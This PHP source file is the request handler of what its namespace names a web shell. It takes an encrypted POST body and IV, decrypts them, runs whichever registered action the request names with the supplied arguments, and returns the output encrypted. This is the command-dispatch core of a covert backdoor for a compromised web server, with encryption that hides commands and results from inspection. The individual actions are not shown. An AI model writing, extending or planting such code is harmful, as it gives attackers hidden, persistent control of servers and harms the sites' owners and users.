<?php
namespace WebShell;

class RequestHandler extends Singleton
{
    private $actions = [];

    public function addAction(string $key, Action $action): void
    {
        $this->actions[$key] = $action;
    }

    public function handle(): string
    {
        // Initialize variables
        $securityService = SecurityService::getInstance();
        $iv = base64_decode($_POST['iv']);
        $body = $_POST['body'];
        $response = '';

        // Validate the request and decrypt body
        if ($this->validateRequest($body, $iv)) {
            // Parse the body
            $request = json_decode($body);

            // Check if there is an appropriate handler configured
            $body = [];
            if (array_key_exists($request->action, $this->actions)) {
                // Call the appropriate action
                $body['output'] = $this->actions[$request->action]->run($request->args);
            }

            // Encrypt the response's body and build the response
            $response = $securityService->encrypt(json_encode($body));
            $response = json_encode($response);
            http_response_code(200);
        } else {
            // Set 403 status code 
            http_response_code(403);
        }

        // Set the content-type header
        header('Content-Type: application/json');
        return $response;
    }

    private function validateRequest(string &$body, string $iv): bool
    {
        // Initialize variables
        $valid = true;
        $securityService = SecurityService::getInstance()->getInstance();

        // Attempt to decrypt the body (and update the reference). If not possible,
        // invalidate the request
        $body = $securityService->decrypt($body, $iv);
        $valid &= ($body !== '');

        return $valid;
    }
}
?>
